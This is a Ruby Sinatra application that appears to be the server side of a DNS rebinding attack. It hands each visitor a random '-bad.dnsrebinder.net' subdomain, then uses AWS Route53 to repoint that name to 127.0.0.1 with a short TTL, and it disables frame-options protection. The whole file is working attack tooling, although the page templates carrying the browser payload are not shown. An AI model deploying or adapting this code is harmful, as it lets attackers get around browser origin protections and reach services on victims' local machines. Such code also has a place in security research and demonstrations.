# app.rb
require 'sinatra'
require 'securerandom'
require 'aws-sdk'

set :protection, :except => :frame_options

HOSTED_ZONE_ID = "Z17OVVKYWHHXDS"
DOMAIN = "dnsrebinder.net"
SUFFIX = "-bad.#{DOMAIN}"

get '/not_found' do
  "notfound?"
end

get '/' do
  if !request.host.end_with?(SUFFIX)
    subdomain = SecureRandom.hex(16)

    @server = "#{subdomain}#{SUFFIX}"
    erb :index
  else
    update_domain(request.host)
    erb :subdomain
  end
end

def update_domain(subdomain)

  puts "updating domain..#{subdomain}"

  route53 = Aws::Route53::Client.new(
    region: 'eu-west-1'
  )
  resp = route53.change_resource_record_sets(
    # required
    hosted_zone_id: HOSTED_ZONE_ID,
    # required
    change_batch: {
      # required
      changes: [
        {
          # required
          action: "UPSERT",
          # required
          resource_record_set: {
            # required
            name: "#{subdomain}",
            # required
            type: "A",
            ttl: 60,
            resource_records: [
              {
                # required
                value: "127.0.0.1",
              },
            ]
          },
        },
      ],
    },
  )

end
